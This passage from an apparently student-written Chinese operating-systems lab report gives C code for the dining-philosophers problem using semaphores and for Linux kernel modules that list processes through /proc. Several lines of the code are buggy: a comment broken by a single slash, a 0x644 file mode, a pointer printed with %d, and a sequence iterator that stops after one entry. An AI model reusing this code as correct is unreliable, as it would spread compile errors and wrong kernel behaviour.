class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>_SEM_SEMUN_UNDEFINED</span></span><br><span class="line"><span class="keyword">union</span> semun</span><br><span class="line">&#123;       <span class="comment">//semctl() 的第四个参数</span></span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seminfo</span> *__<span class="title">buf</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>ERR_EXIT(m) \</span></span><br><span class="line"><span class="keyword">do</span> &#123; \</span><br><span class="line">perror(m); \</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE); \</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_1chopstick</span><span class="params">(<span class="keyword">int</span> no,<span class="keyword">int</span> semid)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//p(1) -1，use sourcec</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sb</span> = &#123;</span>no,<span class="number">-1</span>,<span class="number">0</span>&#125;; <span class="comment">//对第 no 个信号量-1</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = semop(semid,&amp;sb,<span class="number">1</span>); <span class="comment">//对semid信号量集按照sb指示对第一个信号进行操作</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">ERR_EXIT(<span class="string">"semop"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_1chopstick</span><span class="params">(<span class="keyword">int</span> no,<span class="keyword">int</span> semid)</span></span></span><br><span class="line"><span class="function"></span>&#123;/V(<span class="number">1</span>) +<span class="number">1</span>, release source</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sb</span> = &#123;</span>no,<span class="number">1</span>,<span class="number">0</span>&#125;; <span class="comment">//对第 no 个信号量 +1</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = semop(semid,&amp;sb,<span class="number">1</span>); <span class="comment">//对semid信号量集按照sb指示对第一个信号进行操作</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">ERR_EXIT(<span class="string">"semop"</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DELAY (rand() % 5 + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait_for_2chopstick</span><span class="params">(<span class="keyword">int</span> no,<span class="keyword">int</span> semid)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// left and right both -1 p(1),use source</span></span><br><span class="line"><span class="keyword">int</span> left = no;</span><br><span class="line"><span class="keyword">int</span> right = (no + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">buf</span>[2] = &#123;</span> <span class="comment">// left and right both -1</span></span><br><span class="line">&#123;left,<span class="number">-1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">&#123;right,<span class="number">-1</span>,<span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line">semop(semid,buf,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_2chopstick</span><span class="params">(<span class="keyword">int</span> no,<span class="keyword">int</span> semid)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// left and right both +1,release source</span></span><br><span class="line"><span class="keyword">int</span> left = no;</span><br><span class="line"><span class="keyword">int</span> right = (no + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">buf</span>[2] = &#123;</span></span><br><span class="line">&#123;left,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">&#123;right,<span class="number">1</span>,<span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line">semop(semid,buf,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosophere</span><span class="params">(<span class="keyword">int</span> no,<span class="keyword">int</span> semid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">srand(getpid()); <span class="comment">//初始化随机数发生器</span></span><br><span class="line"><span class="keyword">for</span>(;;) &#123;</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is thinking\n"</span>,no);</span><br><span class="line">sleep(DELAY);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is hungry\n"</span>,no);</span><br><span class="line">wait_for_2chopstick(no,semid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is eating\n"</span>,no);</span><br><span class="line">sleep(DELAY);</span><br><span class="line">free_2chopstick(no,semid);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">int</span> left = no;</span><br><span class="line"><span class="keyword">int</span> right = (no + <span class="number">1</span>) % <span class="number">5</span>; <span class="comment">// 一个哲学家的两边</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is thinking\n"</span>,no);</span><br><span class="line">sleep(DELAY);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is hungry\n"</span>,no);</span><br><span class="line">wait_1chopstick(left,semid);</span><br><span class="line">sleep(DELAY);</span><br><span class="line">wait_1chopstick(right,semid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d is eating\n"</span>,no);</span><br><span class="line">sleep(DELAY);</span><br><span class="line">free_1chopstick(left,semid);</span><br><span class="line">        free_1chopstick(right,semid);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> semid;</span><br><span class="line">semid = semget(IPC_PRIVATE,<span class="number">5</span>,IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line"><span class="keyword">if</span>(semid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">ERR_EXIT(<span class="string">"semid"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">union</span> semun su;</span><br><span class="line">su.val = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;++i) &#123;</span><br><span class="line">semctl(semid,i,SETVAL,su);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; <span class="number">5</span>;++i) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">ERR_EXIT(<span class="string">"fork"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == pid) &#123;</span><br><span class="line">num = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">philosophere(num,semid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验三-添加模块"><a href="#实验三-添加模块" class="headerlink" title="实验三 添加模块"></a>实验三 添加模块</h2><p>操作系统在处理应用程序时的过程为：</p><p><code>code -&gt; 编辑(debug) -&gt; 编译(产生等待连接的目标程序) -&gt; 连接(确定本模块和其他所需目标模块调用关系，进行主存连接) -&gt; 运行(调入主存启动运行)</code></p><p><strong>Linux的内核模块</strong></p><p>内核模块是Linux内核向外部提供的一个插口，其全称为动态可加载内核模块（Loadable Kernel Module，LKM），简称模块。Linux内核之所以提供模块机制，是因为它本身是一个单内核（monolithic kernel）。单内核的最大优点是效率高，因为所有的内容都集成在一起，但其缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。 </p><p>模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程是不同的。模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能。</p><p>总之，模块是一个为内核（从某种意义上来说，内核也是一个模块）或其他内核模块提供使用功能的代码块。</p><ol><li>利用内核模块的动态装载性的优点：<br>将内核映象的尺寸保持在最小，并具有最大的灵活性；便于检验新的内核代码，而不需重新编译内核并重新引导。 </li><li>内核模块的缺点：<br>装入的内核模块和其他内核部分一样，具有相同的访问权限，因此，差的内核模块会导致系统崩溃；为了使内核模块访问所有内核资源，内核必须维护符号表，并在装入和卸载模块时修改这些符号表；有些模块要求利用其他模块的功能，因此，内核要维护模块之间的依赖性。内核必须能够在卸载模块时通知模块，并且要释放分配给模块的内存和中断等资源；内核版本和模块版本的不兼容，也可能导致系统崩溃。</li></ol><p><strong>相关操作说明</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a、必需模块函数</span><br><span class="line">加载函数    module_init(hello_init);  </span><br><span class="line">卸载函数    module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">b、可选模块函数</span><br><span class="line">MODULE_LICENSE(“*******”);    许可证申明</span><br><span class="line">MODULE_AUTHOR(“********”);    作者申明</span><br><span class="line">MODELE_DESCRIPTION(“***”);    模块描述</span><br><span class="line">MODULE_VERSION(“V1<span class="number">.0</span>”);       模块版本</span><br><span class="line">MODULE_ALIAS(<span class="string">"*********"</span>);    模块别名</span><br><span class="line">c、加载内核模块</span><br><span class="line">载入模块使用insmod命令：</span><br><span class="line"><span class="meta">#insmod hello.ko</span></span><br><span class="line">卸载内核模块使用rmmod命令：</span><br><span class="line"><span class="meta">#rmmod hello</span></span><br><span class="line">查看内核模块使用lsmod命令：</span><br><span class="line"><span class="meta">#lsmod</span></span><br><span class="line">d、查看模块调用printk输出的信息</span><br><span class="line">   终端方式下，模块加载后即可在屏幕上看到；</span><br><span class="line">   图形界面终端下，使用dmesg命令.</span><br></pre></td></tr></table></figure><p>设计一个模块，功能是列出系统中所有内核进程的程序名、<code>PID</code> 号和进程状态。主要步骤：<br>    阅读内核源代码，了解进程描述符 <code>task_struct</code> 中与本实验有关的成员项，以及访问进程队列的宏 <code>for_each_process</code>；<br>    编写 <code>readprocess</code> 模块，获取进程信息；<br>    修改 Makefile 文件，编译、安装模块，查看输出信息；<br>    查看模块信息，卸载模块。</p><p>下面是动态添加模块的示例</p><p>readprocess.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt; //每个模块都要包括的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt; //printk()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init_task.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">p = <span class="literal">NULL</span>;</span><br><span class="line">p = &amp;init_task;</span><br><span class="line">printk(KERN_ALERT <span class="string">"名称\t进程号\t状态\t父进程号\t"</span>); <span class="comment">////只能使用内核里定义好的C函数，printk会根据日志级别将指定信息输出到控制台或日志文件中，KERN_ALERT会输出到控制台</span></span><br><span class="line">for_each_process(p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;mm == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">"%s\t%d\t%d\t%d\n"</span>,p-&gt;comm,p-&gt;pid,p-&gt;state,p-&gt;real_parent);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">"hello world exit\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ifneq ($(KERNELRELEASE),)</span><br><span class="line">obj-m:=readprocess.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">KDIR:= /lib/modules/$(shell uname -r)/build</span><br><span class="line">PWD:= $(shell pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$(MAKE) -C $(KDIR) M=$(PWD) modules</span><br><span class="line">clean:</span><br><span class="line">$(MAKE) -C $(KDIR) M=$(PWD) clean</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>利用内核模块编程，在 /proc 目录下用自己的学号创建一个目录，如 /proc/201300834101</p><blockquote><p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在 /proc 下还有三个很重要的目录：net，scsi 和sys。 Sys 目录是可写的，可以通过它来访问或修改内核的参数，而 net 和 scsi 则依赖于内核配置。例如，如果系统不支持 scsi，则 scsi 目录不存在。</p><p>还有一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在 /proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。</p></blockquote><p>然后在学号目录下创建一个 processinfo 文件，/proc/201300834101/processinfo ，此文件为只读文件，用于显示所有内核进程的程序名、PID 号和进程状态。主要步骤：</p><p>修改 readprocess 模块，在模块初始化函数中创建目录及 proc 文件，并定义产生 proc 文件内容的函数（获取进程信息）；</p><p>在卸载模块函数中删除相应的 proc 文件及目录；<br>​修改Makefile文件，编译、安装模块；<br>​执行cat /proc/201300834101/processinfo 命令，查看进程信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">Processinfo.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;// 初始化模块</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;// 创建进程信息入口</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/task.h&gt;// 初始进程</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seq_file.h&gt;// 序列文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;       // 内存分配释放  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;   //下一个进程</span></span></span><br><span class="line"><span class="keyword">char</span> modname[] = <span class="string">"201708034210"</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span></span><br><span class="line"><span class="keyword">int</span>  taskcounts=<span class="number">0</span>;<span class="comment">// 全局进程变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">my_seq_start</span><span class="params">(struct seq_file *m, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">///printk(KERN_INFO"Invoke start\n");   //可以输出调试信息</span></span><br><span class="line">   <span class="keyword">if</span> ( *pos == <span class="number">0</span> )  <span class="comment">// 表示遍历开始</span></span><br><span class="line">   &#123;</span><br><span class="line">   task = &amp;init_task;<span class="comment">//遍历开始的记录地址</span></span><br><span class="line">   <span class="keyword">return</span> &amp;task;   <span class="comment">//返回一个非零值表示开始遍历</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//遍历过程中</span></span><br><span class="line">  &#123; </span><br><span class="line">  <span class="keyword">if</span> (task == &amp;init_task ) <span class="comment">//重新回到初始地址，退出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)pos;<span class="comment">//否则返回一个非零值</span></span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_seq_show</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//获取进程的相关信息</span></span><br><span class="line">  <span class="comment">//printk(KERN_INFO"Invoke show\n");</span></span><br><span class="line">  </span><br><span class="line">  seq_printf( m,  <span class="string">"#%-3d\t "</span>, taskcounts );   <span class="comment">//输出进程序号</span></span><br><span class="line">  seq_printf( m,  <span class="string">"%d\t"</span>, task-&gt;pid );<span class="comment">//输出进程pid</span></span><br><span class="line">  seq_printf( m,  <span class="string">"%lu\t "</span>, task-&gt;state );<span class="comment">//输出进程state</span></span><br><span class="line">  seq_printf( m,  <span class="string">"%s\t "</span>, task-&gt;comm );<span class="comment">//输出进程名称(comm)</span></span><br><span class="line">  seq_puts( m, <span class="string">"\n"</span> );    </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">my_seq_next</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//printk(KERN_INFO"Invoke next\n");  </span></span><br><span class="line">  (*pos)++;   </span><br><span class="line">  <span class="comment">//task指向下一个进程?</span></span><br><span class="line">  taskcounts++;</span><br><span class="line">  task= next_task(task);  <span class="comment">//指向下一个进程</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_seq_stop</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//printk(KERN_INFO"Invoke stop\n");</span></span><br><span class="line"><span class="comment">// do nothing        </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">my_seq_fops</span> = &#123;</span><span class="comment">//序列文件记录操作函数集合</span></span><br><span class="line">        .start  = my_seq_start,</span><br><span class="line">        .next   = my_seq_next,</span><br><span class="line">        .stop   = my_seq_stop,</span><br><span class="line">        .show   = my_seq_show</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_open</span><span class="params">(struct inode *inode, struct file *file)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> seq_open(file, &amp;my_seq_fops); <span class="comment">//打开序列文件并关联my_seq_fops</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_proc</span> =   </span></span><br><span class="line"><span class="class">&#123;</span>  <span class="comment">//proc文件操作函数集合</span></span><br><span class="line">.owner      = THIS_MODULE,  </span><br><span class="line">.open       = my_open,</span><br><span class="line">.read       = seq_read,     </span><br><span class="line">.llseek     = seq_lseek,</span><br><span class="line">.release    = seq_release      </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">init <span class="title">my_init</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span>* <span class="title">my_proc_entry</span>;</span></span><br><span class="line">printk( <span class="string">"&lt;1&gt;\nInstalling \'%s\' module\n"</span>, modname );</span><br><span class="line">my_proc_entry = proc_create(modname, <span class="number">0x644</span>, <span class="literal">NULL</span>, &amp;my_proc);<span class="comment">//生成proc文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == my_proc_entry)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span><span class="number">0</span>;  <span class="comment">//SUCCESS</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">my_exit</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove_proc_entry( modname, <span class="literal">NULL</span> );<span class="comment">//删除proc文件</span></span><br><span class="line">printk( <span class="string">"&lt;1&gt;Removing \'%s\' module\n"</span>, modname );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);</span><br><span class="line">module_exit(my_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Makefile</span><br><span class="line">ifneq ($(KERNELRELEASE),)</span><br><span class="line">obj-m:=processinfo.o</span><br><span class="line">else</span><br><span class="line">KDIR:= /lib/modules/$(shell uname -r)/build</span><br><span class="line">PWD:= $(shell pwd)</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line"><span class="meta">$</span><span class="bash">(MAKE) -C $(KDIR) M=$(PWD) modules</span></span><br><span class="line">clean:</span><br><span class="line"><span class="meta">$</span><span class="bash">(MAKE) -C $(KDIR) M=$(PWD) 